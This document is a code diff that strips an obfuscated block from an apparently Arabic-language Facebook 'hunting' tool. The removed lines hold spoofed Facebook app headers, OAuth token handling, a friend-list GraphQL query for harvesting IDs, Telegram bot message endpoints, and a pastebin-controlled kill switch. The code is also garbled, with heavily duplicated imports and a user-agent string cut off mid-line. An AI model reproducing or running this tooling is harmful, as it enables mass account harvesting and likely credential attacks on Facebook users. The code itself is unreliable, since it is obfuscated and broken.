@@ -1,84 +1,3 @@
-
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from time import sleep
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import random
-import os
-import sys
-import time
-import os,sys,time,json,random,re,string,platform,base64
-#mport requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import os
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import os
-import webbrowser
-webbrowser.open('https://t.me/py_1hon')
-import webbrowser
-import requests,time,pyfiglet,datetime
-import time,sys
-def SDMID():
-  try:
-    httpCaht = requests.get("https://pastebin.com/u/VIPBAN1234").text
-    if id in httpCaht:
-      print('')
-      print("\033[1;92m انت مشترڪ VIPاداة المبرمج نمࢪود...!")
-      msg = str(os.geteuid())
-      time.sleep(0.3)
-      pass
-    else:
-      print('')
-      print("\033[1;33m تم ايقاف من قبل المبرمج نمࢪود") 
-      
-      time.sleep(1)
-      sys.exit()
-  except:
-    sys.exit()
-    
-    SDMID()
-def xnxx():
-	print('♡♡♡♡')
-#from rich import print as cetak
 a1 = '\x1b[1;31m'  # أحمر
 print(a1+'''\033[1;34m
 \x1b[38;5;180m \x1b[38;5;180m''') 
@@ -478,505 +397,6 @@ for xd in range(10000):
   "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320))",
   "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960)",
   "Mogujie4Android/NAMhuawei/1290)",
-  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Bu"
-  
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from time import sleep
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import os
-import webbrowser
-webbrowser.open('https://t.me/py_1hon')
-import webbrowser
-import requests,time,pyfiglet,datetime
-import time,sys
-def SDMID():
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "VIP" 
-  try:
-    httpCaht = requests.get("https://pastebin.com/raw/rrEvSNFF").text
-    if id in httpCaht:
-      print('')
-      print("\033[1;92m انت مشترڪ VIPاداة المبرمج نمࢪود...!")
-      msg = str(os.geteuid())
-      time.sleep(0.3)
-      pass
-    else:
-      print('')
-      print("\033[1;33m تم ايقاف من قبل المبرمج نمࢪود") 
-      
-      time.sleep(1)
-      sys.exit()
-  except:
-    sys.exit()
-    
-    SDMID()
-SDMID()
-_IIllIIIllllIIIIIl ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:47.0) Gecko/20100101 Firefox/47.0'
-_IIIlIIIIIIIIlIllI ='Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IIlIIIllIIllIlIlI ='Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko'
-_IIIIllllIIIlllIII ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36'
-_IIlIlIllIIIllIIlI ='Mozilla/5.0 (X11; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0'
-_IIIlIlIlIIIllIIlI ='Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0'
-_IIIlllIlIIIlIlllI ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0'
-_IIlIIlIIlllllIIIl ='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0'
-_IllIIllIIIIIIIlII ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36'
-_IIIlIlIIIlIllllll ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:45.0) Gecko/20100101 Firefox/45.0'
-_IIIlllIIIIIlIIlII ='Mozilla/5.0 (Windows NT 5.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'
-_IllIIIllIlllIIIII ='Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'
-_IlllIlllIllIllllI ='Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IlIIlIIllIlllIIlI ='Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0'
-_IllllIIlIlIIIIIIl ='Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36'
-_IllIIlIlIlIlIIIlI ='Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36'
-_IIllllIlllIllllll ='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36'
-_IlIIllIIIllIIIlII ='Mozilla/5.0 (X11; Linux i686 on x86_64; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IlIllIIlIIllIIIII ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36'
-_IlIlIIllIIIlllIlI ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0'
-_IllIIllllIIllIIlI ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.75 Safari/537.36'
-_IIlIIIlIlIIllllIl ='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0'
-_IIlllllIIllllIlII ='Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IlIlIIlllIlIIIllI ='Mozilla/5.0 (Windows NT 6.3; rv:47.0) Gecko/20100101 Firefox/47.0'
-_IlIIllllIIlllllll ='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'
-_IllIIIllIllllIIII ='Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36'
-_IlIlIIlllIlIIlllI ='Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36'
-_IIIllIlIlIlIlIllI ='Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36'
-_IlIllIllllIIlIIII ='Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'
-_IIIIIlIIlIIllllII ='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IllIlIIlIIIllllll ='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36'
-_IllIIllIIIllllIll ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0'
-_IIIIIllIIIlIllIIl ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36'
-_IlIIlIlIIllIllIll ='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'
-_IlllIlIIIlllIlIll ='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36'
-_IllIlIlIIIllIlIll ='Mozilla/5.0 (Windows NT 6.3; rv:49.0) Gecko/20100101 Firefox/49.0'
-_IIllIlllIlllIIlll ='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0'
-_IIIIlIllIllIllIIl ='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; Trident/4.0)'
-_IIllIllIIlIIlIIll ='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36'
-_IIlIIllllllIllllI ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36'
-_IllIlIIllIIlIIIII ='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/6.0)'
-_IlIIlIlIlllllIIll ='Mozilla/5.0 (Windows NT 6.2; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0'
-_IIllIIIIllIllllIl ='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Win64; x64; Trident/5.0)'
-_IlllIIIlllIllIlIl ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36'
-_IIIIIllllIIlIIIll ='Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IIIlIlIlIIllIllll ='Mozilla/5.0 (Windows NT 6.2; rv:46.0) Gecko/20100101 Firefox/46.0'
-_IIlllIIIIIllllllI ='Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36'
-_IllIlIlllllIllIII ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36'
-_IIlIllllllllIIlIl ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0'
-_IllIllllllllIIIll ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36'
-_IIllIllIllllllIll ='Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0'
-_IlllllIIlllllllII ='Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IllIllIlIIIIlIlIl ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IlIIlllllIIlIllIl ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0'
-_IIllllIllllIlIlII ='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)'
-_IIIlIlIIIlIllIIIl ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
-_IIIIIIlllIllIIlll ='Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0'
-_IlIlIlllIIlIIllII ='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0)'
-_IIlIIlIIlllIlIIII ='Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0'
-_IlIIIIIIllIllIlIl ='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)'
-_IlIIIIllllIIlllIl ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:47.0) Gecko/20100101 Firefox/47.0'
-_IIllIlIlIIIIIllll ='Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0'
-_IlIlIIllIlIIIIIIl ='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36'
-_IIlIIlIllIIllIIII ='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0'
-_IllIlIlIIIllIllll ='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/5.0)'
-_IIIIlllIIlllIIIlI ='Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36'
-_IllIIlIlllIIllIlI ='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'
-_IllIIlIllIllIlIII ='Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36'
-_IlllIlIllllIlIllI ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0'
-_IlllIllIllIllllIl ='Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36'
-_IlllIllIIIIIlIIIl ='\x1b[2;32m'
-_IIIlIIIlllllIIlII ='pip install stdiomask'
-_IIllllIlllIIIllII ='pip install rich'
-_IllllIIllIIIllllI ='\x1b[1;95m'
-_IlIllIlIIIIlllIII ='\x1b[1;94m'
-_IlllIIllIlIllIlll ='\x1b[1;93m'
-_IIIIIIlIIllllIlll ='\x1b[38;5;117m'
-_IllIIllIlIlIlllll ='\x1b[38;5;247m'
-_IllIIIllIlllIlIll ='\x1b[38;5;188m'
-_IlIlIIllllIlllIlI ='\x1b[38;5;172m'
-_IIIlIlllllIIlIllI ='\x1b[38;5;228m'
-_IlIlllllIlIIIIlII ='\x1b[38;5;246m'
-_IlllIIllIIlIllIlI ='\x1b[38;5;252m'
-_IIllIlIlllIlIIIIl ='\x1b[38;5;94m'
-_IllIllIlIIllIlIIl ='\x1b[38;5;180m'
-_IIIIIIllllIlIIllI ='\x1b[38;5;255m'
-_IIlIlIllIIllllIll ='\x1b[38;5;233m'
-_IIllIllIlIIlIIIlI ='\x1b[38;5;236m'
-_IIIIlIlIIIIlIIllI ='\x1b[38;5;161m'
-_IIlIlIllIlIlIIIII ='\x1b[38;5;205m'
-_IIlIIlIlIllIIIlIl ='\x1b[38;5;91m'
-_IIlIIIlllIlIIIlll ='\x1b[38;5;234m'
-_IllIIlIIIIlllIIIl ='\x1b[38;5;166m'
-_IIIIIlllllIIllIll ='\x1b[38;5;136m'
-_IllIIllIIlIIllIll ='\x1b[38;5;226m'
-_IlIIlIlIlllIIlIll ='\x1b[38;5;88m'
-_IllIllllIIIllIIll ='\x1b[38;5;196m'
-_IIIlIlIIIllllIlll ='\x1b[38;5;22m'
-_IIIIllIlIlIlIIlll ='mobile'
-_IllllIlIllllIlIll ='8.1.0'
-_IlIlIllIIllllIIll ='\x1b[1;96m'
-_IIlIlllIlIIlIlIlI ='\x1b[1;92m'
-_IIIlIIlIIIIllIlIl ='\x1b[1;91m'
-_IIIIlIlIIllllllII ='\x1b[32m'
-_IIIIIIlIIIlIllllI ='\x1b[38;5;231m'
-_IIlIlllIlIIlIIIll ='\x1b[38;5;216m'
-_IIIIlIlIIllIllIlI ='\x1b[38;5;18m'
-_IlIIllIIllllIlIII ='\x1b[38;5;7m'
-_IIIlIIlIlIIIlIIll ='\x1b[38;5;8m'
-_IllIlIIIIIlIllllI ='\x1b[38;5;52m'
-_IIlIllIIllllllllI ='\x1b[38;5;13m'
-_IlllIlIlllIllIlIl ='\x1b[38;5;5m'
-_IIIllllIlIlIIlIlI ='user-agent'
-_IIlIIIlllllIIIIII ='Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0'
-_IIIlIIIIIIlllIIlI ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36'
-_IlIllIlllIIIllIll ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0'
-_IlIIllllIIIlIllIl ='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)'
-_IIlIllIIlIlllIIIl ='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)'
-_IlllIIIIlIllIIIlI ='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0'
-_IlIlIlIlIlllIIIII ='Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0'
-_IIlIIIIIIlIlIllII ='\x1b[2;36m'
-_IIlllIlIlIlIlIlIl ='https://graph.facebook.com/graphql'
-_IIllIIllIllIlIIII ='true'
-_IlIIlIIIlIllllIll ='["At_Connection","GraphServices"]'
-_IllIIlIIlIllIlIll =',"suggestion_friends_paginating_first":2500}'
-_IIlIIIIIllllIlIlI ='{"profile_id":'
-_IIlIlIlIIIlllIlIl ='false'
-_IllIlIIlllllllllI ='en_US'
-_IIIIlIIIllllIIIlI =';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
-_IIlIllIlIIIlIIIll =';FBPN/com.facebook.katana;FBDV/'
-_IIlIIlllIIIIlIIll =' MOBILE LIMITED;FBBD/'
-_IllIlllllIlIlIlIl =';FBMF/'
-_IIIIllIlIlllIIllI ='[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/'
-_IIIlIlIIIlIlIIIlI ='purpose'
-_IIIIllIlIlIlIlIlI ='server_timestamps'
-_IlIIIIIIlIIlIIIlI ='client_trace_id'
-_IllIIIIIIlllllIII ='fb_api_analytics_tags'
-_IIIIllllIIlIllllI ='fb_api_caller_class'
-_IlIIlIIlIIllIlIII ='fb_api_req_friendly_name'
-_IlIIlIIlllIIIlIII ='variables'
-_IlIlIIlllllllIIll ='format'
-_IlIlIllIIIIlllIlI ='pretty'
-_IIlIllIIIIIIIllll ='locale'
-_IIlllIlIllIIIIllI ='client_doc_id'
-_IllIlIlllllIIIllI ='efle33lbff1cd312f36aa5f2c69c59a9'
-_IIllIllIIlllIIIlI ='Liger'
-_IIIlllIIIlllllIll ='gzip, deflate'
-_IlIlllIllIIIlIIll ='cached=0;state=URL_ELIGIBLE'
-_IIIlllIIIIllllIll ='False'
-_IlllIIIlIIlIIlIll ='4481'
-_IIlIIlllllIllIIll ='WIFI'
-_IIllIllIllIIllIlI ='nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=efle33lbff1cd312f36aa5f2c69c59a9'
-_IlIlIllllIIIlIIlI ='OAuth '
-_IIlIIIIllllllIIIl ='2368177546817l46'
-_IllIlIIIIlIIIllll ='Content-Length'
-_IIIlIlllllIIlIIlI ='Content-Type'
-_IlIIllIlIIIlIlIlI ='X-Fb-Connection-Token'
-_IIlIlIlIllIIllIlI ='X-Fb-Server-Cluster'
-_IIllIlllIIlIlIlll ='X-Fb-Client-Ip'
-_IllIlIIllIllIIIIl ='X-Fb-Http-Engine'
-_IlIlIIIIIIIlllIII ='Accept-Encoding'
-_IllIllIlllIIIIIIl ='Priority'
-_IlllIIlllllIIIllI ='X-Fb-Request-Analytics-Tags'
-_IIIIlIIlIlIllIlII ='X-Fb-Friendly-Name'
-_IlIllllllIIllIIII ='X-Fb-Ta-Logging-Ids'
-_IIIlllIllIIIIIIIl ='X-Fb-Rmd'
-_IIllIIIlIIllllIll ='X-Tigon-Is-Retry'
-_IIllllllIlllIIIII ='X-Fb-Device-Group'
-_IlIIIlIIIlllIllIl ='X-Fb-Connection-Type'
-_IlIIIIIIIIIIIIllI ='X-Fb-Session-Id'
-_IIlIIllIllIllllll ='Authorization'
-_IlllIIllIlIIIlIII ='X-Fb-Sim-Hni'
-_IIIIIIlIlllllIIlI ='X-Fb-Net-Hni'
-_IIlllIlllllIIIIIl ='X-Fb-Background-State'
-_IIIllllIIIlIlllII ='X-Fb-Privacy-Context'
-_IIlIIIIIllIlllIII ='X-Graphql-Request-Purpose'
-_IllIlIlIIIIIIIlll ='X-Graphql-Client-Library'
-_IIIIIlIIIIIIlIlIl ='01'
-_IlllllIIIIIllIIlI ='name'
-_IIIIllIIllIllIIIl ='form'
-_IllIIIIlIlIIIlIIl ='.txt'
-_IlIIllIIIIIIIIlll ='\x1b[38;5;153m━━'
-_IlIllIllIllllIlIl ='\x1b[38;5;220m'
-_IlllIIlIlIIIllIII ='\x1b[1;37m'
-_IllIlIlllIllIIlIl ='12'
-_IlIIIIIIIlIllIIlI ='11'
-_IIllIlllIlIlIlIII ='10'
-_IIIlIIIlllIIlIIII ='&text='
-_IlIlIllIllIIIIlII ='/sendMessage?chat_id='
-_IlIIIIlIIllIlIllI ='https://api.telegram.org/bot'
-_IllIIlllIIIllllIl ='edges'
-_IIIIllllllllllIIl ='friends'
-_IIIlIllIIllIlIIll ='user'
-_IlIlIIlIIlIlIIlIl ='data'
-_IIIlIIlIlIlllIIlI ='application/x-www-form-urlencoded'
-_IllIIIllIlIllllII ='html.parser'
-_IIIIIIIlIllIIlIII ='access_token'
-_IIIIllIlllIIIIIIl ='User-Agent'
-_IlllllIIlIlIlIIII ='\x1b[1;97m'
-_IllIllIlIIIlIIIII =True 
-_IllIIIlIllIIlllII ='json'
-_IIllIllllIIlIIllI ='\x1b[1;30m'
-_IlIIIIIlllllIlIll ='\x1b[38;5;208m'
-_IllllIlIIIIlllIll ='\x1b[1;32m'
-_IllIIIlIIllIlllII ='\x1b[1;34m'
-_IlIIIlIllIIlIllIl ='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)'
-_IlllIlIIllIIllIll ='method'
-_IllIIIIlllllIlIII ='.token.txt'
-_IIllIlIlllIIIlIlI ='utf-8'
-_IllIlIIllIIIIIIII ='\x1b[38;5;153m'
-_IIIllllIIIlIIlIII ='Y'
-_IIllIlllIIIIIlIlI ='a'
-_IIIIIIlIIIlIllIIl ='A'
-_IlIIIllIllIlIllll ='\x1b[1;33m'
-_IIIIIllllIlIlIIII ='-'
-_IllIllIIIlIlIIlll ='True'
-_IlIIllIllIIIllllI ='SuggestionsFriendListContentQuery'
-_IlIIlIIlIlllllIlI ='41001'
-_IIIlIlllllIIIIIII ='fetch'
-_IIIlIIlllIlIIIIll ='post'
-_IIllIlIlIlIlIIllI ='r'
-_IlIlIIIIlllIlIIlI ='\x1b[1;31m'
-_IIIlIllllllIIllII ='graphservice'
-_IIIIIIIlIIIlIIlIl ='|'
-_IlIIlllIIlIIllIlI ='clear'
-_IlIlIllllIIlIIllI ='\n'
-_IIllIIlIllllIlIIl ='1'
-IIllIllIlIIllIIII =_IlIlIIIIlllIlIIlI 
-print (IIllIllIlIIllIIII +'\x1b[1;34m\n\x1b[38;5;180m \x1b[38;5;180m')
-IIIIIIIIIIIllIlII ='\n\x1b[1;31m \n──────────────────────────────────────────────────────\n─██████████████─████████████───██████──────────██████─\n─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██████████████▒▒██─\n─██▒▒██████████─██▒▒████▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─\n─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─\n─██▒▒██████████─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─\n─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─\n─██████████▒▒██─██▒▒██──██▒▒██─██▒▒██──██████──██▒▒██─\n─────────██▒▒██─██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─\n─██████████▒▒██─██▒▒████▒▒▒▒██─██▒▒██──────────██▒▒██─\n─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██──────────██▒▒██─\n─██████████████─████████████───██████──────────██████─\n────────────────────────────────────────────────────── '
-import requests ,bs4 ,json ,os ,sys ,random ,datetime ,time ,re ,urllib3 ,rich ,base64 
-from time import sleep 
-from rich .table import Table as me 
-from rich .console import Console as sol 
-from bs4 import BeautifulSoup as sop 
-from bs4 import BeautifulSoup as parser 
-from concurrent .futures import ThreadPoolExecutor as tred 
-from rich .console import Group as gp 
-from rich .panel import Panel as nel 
-from rich import print as cetak 
-from rich .markdown import Markdown as mark 
-from rich .columns import Columns as col 
-from rich import print as rprint 
-from rich import pretty 
-from rich .text import Text as tekz 
-import os ,webbrowser 
-webbrowser .open ('')
-from datetime import *
-import requests 
-IIllIllIlIIllIIII =_IlIlIIIIlllIlIIlI 
-IlIlIlIIIlIllllIl =_IllIIIlIIllIlllII 
-IlIIIlllllIllIllI =_IllllIlIIIIlllIll 
-IIIllllIlIlIlIllI =_IlIIIllIllIlIllll 
-IIlllIIlIIlllIIIl =_IlIIIIIlllllIlIll 
-IlllllIIIIIIIlIII =_IlllIlIlllIllIlIl 
-IIIIIllIllllllIIl =_IIlIllIIllllllllI 
-IlllllIIllIIIIIIl =_IIllIllllIIlIIllI 
-IIIllIlIllIIllIll =_IlllIIlIlIIIllIII 
-IlIIllIlIIllIlllI =_IllIlIIIIIlIllllI 
-IlIIIlIIIIlIlIIll =_IIIlIIlIlIIIlIIll 
-IlIlIIIllllllIIIl =_IlIllIllIllllIlIl 
-IIIIIIlIlIIIlIIIl =_IlIIllIIllllIlIII 
-IllIlllIlIIllIIll =_IllIlIIllIIIIIIII 
-IIllllIIlIIIIIIlI =_IIIIlIlIIllIllIlI 
-IIIlllIlIlIlIlIIl =_IllIlIIllIIIIIIII 
-print (IIIIIIIIIIIllIlII )
-print ('')
-print (_IlIIllIIIIIIIIlll *30 )
-print (_IlIIllIIIIIIIIlll *30 )
-print ('\x1b[1;38m[1]  - صـنـع مــلــف ايـديـات')
-print (IlIIIlllllIllIllI +'=='*30 )
-print ('\x1b[1;38m[2]  - تشـغـيل اداة صـيد من ملـف')
-print (_IlIIllIIIIIIIIlll *30 )
-print (_IlIIllIIIIIIIIlll *30 )
-print ('')
-IlllIllIllIIIIIII =input ('  𝖤𝗇𝗍𝖾𝗋 : ')
-if IlllIllIllIIIIIII ==_IIllIIlIllllIlIIl :
-	IIllIllIlIIllIIII =_IlIlIIIIlllIlIIlI ;IlIlIlIIIlIllllIl =_IllIIIlIIllIlllII ;IlIIIlllllIllIllI =_IllllIlIIIIlllIll ;IIIllllIlIlIlIllI =_IlIIIllIllIlIllll ;IIlllIIlIIlllIIIl =_IlIIIIIlllllIlIll ;IlllllIIIIIIIlIII =_IlllIlIlllIllIlIl ;IIIIIllIllllllIIl =_IIlIllIIllllllllI ;IlllllIIllIIIIIIl =_IIllIllllIIlIIllI ;IIIllIlIllIIllIll =_IlllIIlIlIIIllIII ;IlIIllIlIIllIlllI =_IllIlIIIIIlIllllI ;IlIIIlIIIIlIlIIll =_IIIlIIlIlIIIlIIll ;IlIlIIIllllllIIIl =_IlIllIllIllllIlIl ;IIIIIIlIlIIIlIIIl =_IlIIllIIllllIlIII ;IllIlllIlIIllIIll =_IllIlIIllIIIIIIII ;IIllllIIlIIIIIIlI =_IIIIlIlIIllIllIlI ;IIIlllIlIlIlIlIIl =_IllIlIIllIIIIIIII ;IIIllIlllIIllIlIl =_IIIlIlIIIllllIlll ;IlIlIllllIllIlIlI =_IllIllllIIIllIIll ;IlIllIllIIIlIllIl =_IlIIlIlIlllIIlIll ;IIllllIlllIIIlIll =_IllIIllIIlIIllIll ;IlIlIllllIIlIllIl =_IIIIIlllllIIllIll ;IlIllIlIIllIllIIl =_IIlIlllIlIIlIIIll ;IIIllIlIIlllIIlIl =_IllIIlIIIIlllIIIl ;IIIlIlIlllIIllIll =_IIlIIIlllIlIIIlll ;IIllllllIIlllIllI =_IIlIIlIlIllIIIlIl ;IllllIlllllIllIlI =_IIlIlIllIlIlIIIII ;IIlIIlIIIlIlIlllI =_IIIIlIlIIIIlIIllI ;IIIIIIlIlIIlllIll =_IIllIllIlIIlIIIlI ;IlIIIlIIIIlIIIlII =_IIlIlIllIIllllIll ;IlIllIllIIllIIlll =_IIIIIIllllIlIIllI ;IIllIIlIIIlIIlIIl =_IIIIIIlIIIlIllllI ;IlllIIIIIIlIIlllI =_IllIllIlIIllIlIIl ;IIlllIlIlIlllllII =_IIllIlIlllIlIIIIl ;IlllllIlIIIlIIIIl 